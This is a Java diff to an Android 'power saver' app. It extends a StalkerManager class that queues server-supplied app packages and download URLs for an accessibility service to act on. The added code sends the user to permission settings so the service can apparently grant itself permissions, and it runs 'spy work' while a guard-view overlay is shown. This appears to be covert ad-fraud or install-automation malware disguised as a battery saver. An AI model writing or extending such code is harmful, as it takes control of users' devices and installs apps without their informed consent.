@@ -1,10 +1,12 @@
 package com.luna.powersaver.gp.manager;
 
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.support.annotation.Nullable;
 import android.text.TextUtils;
 
+import com.luna.powersaver.gp.PowerSaver;
 import com.luna.powersaver.gp.common.StaticConst;
 import com.luna.powersaver.gp.entity.JsonAppInfo;
 import com.luna.powersaver.gp.http.DownloadManager;
@@ -137,7 +139,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 判断并添加新增的任务，建议线程中执行
      */
     public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
-        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务： " + newpkgs);
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "准备添加新任务，任务量: " + newpkgs.size());
         if (mWaitingList == null || mTotalMap == null) {
             restoreCurrentTask();
         }
@@ -147,7 +149,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                 continue;
             old = mTotalMap.get(info.pkg);
             if (old == null) {
-                AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务： " + info.pkg);
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务，对应包名： " + info.pkg);
                 mWaitingList.add(info);
                 mTotalMap.put(info.pkg, info);
             } else {
@@ -166,6 +168,8 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                         }
                     }
                     mWaitingList.add(old);
+                } else {
+                    AppDebugLog.d(AppDebugLog.TAG_STALKER, "该任务已经存在且无须重置!");
                 }
             }
         }
@@ -198,6 +202,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         mIsInSpying = true;
         mHandler.removeCallbacks(run);
         mHandler.postDelayed(run, DEFAULT_SPY_DIFF_TIME);
+        DownloadManager.getInstance(StaticConst.sContext).addDownloadListener(this);
     }
 
 
@@ -213,6 +218,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         pCurrentWorkInfo = null;
         NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.CLEAR;
         ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
+        DownloadManager.getInstance(StaticConst.sContext).removeDownloadListener(this);
     }
 
     /**
@@ -223,6 +229,15 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         if (!NBAccessibilityService.sIsInWork) {
             return;
         }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && !AppUtil.hasAllPermissions(StaticConst.sContext)) {
+            AppDebugLog.d(AppDebugLog.TAG_STALKER, "有未授权选项，需要首先进行判断设置权限");
+            NBAccessibilityService.sCurrentWorkState = 0;
+            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.SET_PERMISSION;
+            AppUtil.jumpToDetailSetting(StaticConst.sContext, StaticConst.sContext.getPackageName());
+            return;
+        }
+
         NBAccessibilityService.sRetryTime = 0;
 
         if (mTotalMap == null || mWaitingList == null)
@@ -243,7 +258,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                 info = iterator.next();
                 if (info == null) {
                     iterator.remove();
-                } else if (curTime >= info.endtime
+                } else if ((info.endtime > 0 && curTime >= info.endtime)
                         || info.execstate == JsonAppInfo.EXC_STATE.DISCARD
                         || info.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
                     // 已经超时，任务废弃
@@ -461,6 +476,12 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
             doStart();
             return;
         }
+        if (info == null) {
+            info = new DownloadInfo();
+            info.setPackageName(pCurrentWorkInfo.pkg);
+            info.setDownloadUrl(pCurrentWorkInfo.url);
+            info.setDestUrl(pCurrentWorkInfo.url);
+        }
         NBAccessibilityService.sCurrentWorkState = 0;
         NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         switch (pCurrentWorkInfo.keepstate) {
@@ -643,8 +664,10 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
 
     public void judgeClearList() {
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行清洁保存任务：" + NBAccessibilityService.sIsInWork);
-        if (!NBAccessibilityService.sIsInWork) {
-            StalkerManager.get().saveCurrentTask();
+        StalkerManager.get().saveCurrentTask();
+        if (PowerSaver.get().isGuardViewShown()) {
+            startSpyWork();
+        } else {
             pCurrentWorkInfo = null;
             mTotalMap = null;
             mWaitingList = null;
